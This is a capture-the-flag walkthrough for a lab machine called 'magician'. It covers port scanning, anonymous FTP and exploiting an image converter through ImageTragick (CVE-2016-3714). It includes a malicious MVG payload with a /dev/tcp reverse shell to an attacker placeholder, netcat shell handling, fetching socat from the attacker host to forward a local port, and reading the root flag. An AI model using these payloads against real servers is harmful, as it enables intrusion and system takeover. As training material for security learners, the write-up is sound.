# Scenario

Note: this machine needs about 7 minutes to start up, please be patient :)

Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.
On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.

Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)

Have fun and use your magic skills!

# Enumeration

## \[+] 10.10.200.16 - magician

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.200.16 magician" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.200.16
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## Port 21 - FTP

We can try to explore the FTP server using an anonymous login and hit the `ENTER` key when prompted for a password. There will be an intentionally long delay before we see a message from the administrator:

```sh
ftp anonymous@magician
```

```plaintext
230-Huh? The door just opens after some time?
You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;)
Since you're a rookie, this might help you to get started: https://imagetragick.com.
You might need to do some little tweaks though...

# Initial Foothold

## Port 8081 - HTTP

On this port we will find the image converter web application. It takes PNG images, converts them into JPG and displays them in a list:

![a68f34bbcf7aa2befbf6ac7bfb26564c.png](/resources/92e275022a6f481288fef7a901eecb16.png)

From the hint we got when connecting to the FTP server, we can search for "imagetragick" or [visit the URL](https://imagetragick.com/) in the hint. You can also find payloads in the [PayloadAllTheThings repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20ImageMagick). This exploit has the ID CVE-2016-3714.

We will create a malicious PNG file using [nano](https://linux.die.net/man/1/nano) or any other text editor:

```sh
nano exploit.png
```

Then paste the following and edit the IP and port of your attacking machine:

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/<ATTACKER_IP>/<PORT> 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

Then, press `CTRL+X` and enter `Y` to save then exit.

Next, we open our [Netcat](https://linux.die.net/man/1/nc) listener before sending our payload:

```sh
nc -nvlp 4444
```

Back on the image conversion website, we upload our malicious file `exploit.png` at which point the page will hang:

### \[-] magician\@magician

Checking our Netcat listener, we should have a connection back from the victim machine:

![77f8367693a6edc46597ad23d70e1c8b.png](/resources/5a1f8ef35cef4a3ea996bec566b68745.png)

Let's stablize the shell we just got by doing the following steps:

1. Use Python to spawn a stable shell:
   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```
2. `CTRL+Z` to background the current shell
3. Fix echoing and foregrounds the shell:
   ```sh
   stty raw -echo;fg
   ```
4. Set terminal to use 256 colors:
   ```sh
   export TERM=xterm-256color
   ```

We can find the user flag in `/home/magician/user.txt`:

```sh
cd /home/magician
ls -lah
cat user.txt
```

# Privilege Escalation

### \[-] root\@magician

Inside `/home/magician/the_magic_continues`, we will find our next clue which is hinting at a service running on the local host:

```sh
magician@magician:~$ cat the_magic_continues
```

```plaintext
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

To see all the network connections on the machine, we can use [Netstat](https://linux.die.net/man/8/netstat) with the flags `-tunlp`:

- `-t`: Displays TCP connections.
- `-u`: Displays UDP connections.
- `-n`: Shows numerical addresses instead of resolving hostnames. This means IP addresses and port numbers will be shown in numeric form rather than trying to resolve them to hostnames or service names.
- `-l`: Shows only listening sockets. This filters the output to only show ports that are currently open and waiting for incoming connections.
- `-p`: Displays the process ID (PID) and name of the program to which each socket belongs. This can be useful for identifying which processes are using which ports.

There is a service running on `127.0.0.1:6666`. We can use a [static socat binary](https://github.com/ernw/static-toolbox/releases) to forward the port so that we can access it.

On the attacking machine, after downloading the `socat` binary, host it using a Python HTTP server:

```sh
python3 -m http.server 8888
```

On the victim machine, download the file using `wget` and make it executable using `chmod +x` then run `socat` with the following parameters which will listen on port 7777 and forward the data to port 6666 locally:

```sh
cd /tmp
wget <ATTACKER_IP>:8888/socat
chmod +x socat
./socat tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
```

Back on the attacking machine, we can now access this page by navigating to `http://magician:7777` in a web browser:

![c1f9c8d1e7363b22604b66ad3f8765de.png](/resources/1d2b94c42775430fafd2f762cb801250.png)

This web application will read local files and print them on the web page. We can find the root flag in `/root/root.txt`:

![db434eccce1542c6b5a3127d888eb6a6.png](/resources/25b864a4ac7d411d9225823b841e8b63.png)

The data is encoded in hex, so we can use something like [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex\('None'\)\&input=NTQ0ODRkN2I2ZDYxNjc2OTYzNWY2ZDYxNzk1ZjZkNjE2YjY1NWY2ZDYxNmU3OTVmNmQ2NTZlNWY2ZDYxNjQ3ZDBh) to get the plaintext:
